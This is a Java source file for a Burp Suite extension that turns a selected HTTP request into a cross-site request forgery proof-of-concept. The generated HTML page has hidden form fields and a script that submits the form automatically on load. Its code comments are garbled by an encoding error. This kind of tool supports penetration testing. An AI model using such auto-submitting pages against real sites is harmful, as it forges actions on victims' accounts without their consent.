package burp;

import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.List;


public class BurpExtender implements IBurpExtender, IContextMenuFactory {

    public IBurpExtenderCallbacks callbacks;
    public IExtensionHelpers helpers;
    public PrintWriter stdout;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);

        // ���ò����
        callbacks.setExtensionName("Mi1k7ea");
        callbacks.registerContextMenuFactory(this);
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        // �����Ĳ˵�
        List<JMenuItem> jMenuItemList = new ArrayList<>();
        JMenu jMenu = new JMenu("Mi1k7ea's Extender");
        JMenuItem jMenuItem = new JMenuItem("Generate CSRF PoC");
        jMenu.add(jMenuItem);
        jMenuItemList.add(jMenu);

        // ���������Ĳ˵�����¼�
        jMenuItem.addActionListener(e -> {
            // ����PoC��GUI��
            JFrame frame = new JFrame("CSRF PoC");
            JPanel codePanel = new JPanel(new GridLayout());

            // getSelectedMessages()�������ڻ�ȡ��ǰ��ʾ�Ļ��û�ѡ�е�HTTP����/��Ӧ��ϸ��
            // analyzeRequest()�������ڷ���HTTP������Ϣ�Ա��ȡ���������ֵ
            IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[0];
            IRequestInfo iRequestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);

            URL url = iRequestInfo.getUrl();
            String method = iRequestInfo.getMethod();
            String http_method = "";
            String request_url = "";
            String params = "";

            try {
                // ��ȡrequest���������ɶ�Ӧinput��ǩ
                List<IParameter> iParameters = iRequestInfo.getParameters();
                for (IParameter iParameter : iParameters) {
                    if (method.equals("POST")) {
                        request_url = url.toString();
                        http_method = " method=\"POST\"";
                        if (iParameter.getType() == IParameter.PARAM_BODY) {
                            params += "      <input type=\"hidden\" name=\"" + EncodeSpecialChars(iParameter.getName()) + "\" value=\"" + EncodeSpecialChars(iParameter.getValue()) + "\" />\n";
                        }
                    } else if (method.equals("GET")) {
                        request_url = url.toString().split("\\?")[0];
                        http_method = " method=\"GET\"";
                        if (iParameter.getType() == IParameter.PARAM_URL) {
                            params += "      <input type=\"hidden\" name=\"" + EncodeSpecialChars(iParameter.getName()) + "\" value=\"" + EncodeSpecialChars(iParameter.getValue()) + "\" />\n";
                        }
                    }
                }
            } catch (Exception exception) {
                exception.printStackTrace();
            }

            // ��ϳ�CSRF�Զ��ύPoC
            final String PoC = "<html>\n" +
                    "  <body>\n" +
                    "    <form action=\"" + request_url + "\"" + http_method + ">\n" +
                    params +
                    "      <input type=\"submit\" value=\"Submit request\" />\n" +
                    "    </form>\n" +
                    "  </body>\n" +
                    "  <script>\n" +
                    "    var m = document.getElementsByTagName('form')[0];\n" +
                    "    m.submit();\n" +
                    "  </script>\n" +
                    "</html>";;

            // ��PoC���õ��½���GUI����
            JTextArea jt = new JTextArea(PoC);
            JScrollPane scrollPane = new JScrollPane(jt);
            jt.setEditable(false);

            frame.add(codePanel, BorderLayout.CENTER);
            codePanel.add(scrollPane);

            // �½�Buttom����Copy PoC
            JPanel buttonPanel = new JPanel(new FlowLayout());
            JButton button = new JButton("Copy");
            buttonPanel.add(button);
            frame.add(buttonPanel, BorderLayout.PAGE_END);
            button.addActionListener(e1 -> {
                Toolkit toolkit = Toolkit.getDefaultToolkit();
                Clipboard clipboard = toolkit.getSystemClipboard();
                StringSelection CSRFCodeToCopy = new StringSelection(PoC);
                clipboard.setContents(CSRFCodeToCopy, CSRFCodeToCopy);
            });

            // ����GUI����ʽ
            frame.setSize(600,500);
            frame.setVisible(true);
            frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        });

        return jMenuItemList;
    }

    // ����URL����Ͷ�input��ǩ�ڵ�����ֵ�����ַ�����HTML���룬�����в���
    public static String EncodeSpecialChars(String content) throws Exception {
        content = URLDecoder.decode(content, "UTF-8");
        String special_word = "<>\"'";
        for (int i = 0; i < special_word.length(); i++) {
            char word = special_word.charAt(i);
            String w = Character.toString(word);
            if (content.contains(w)) {
                String ascii_word = Integer.toString(word);
                String html_word = "&#" + ascii_word + ";";
                System.out.println(html_word);
                content = content.replace(w, html_word);
            }
        }
        return content;
    }

}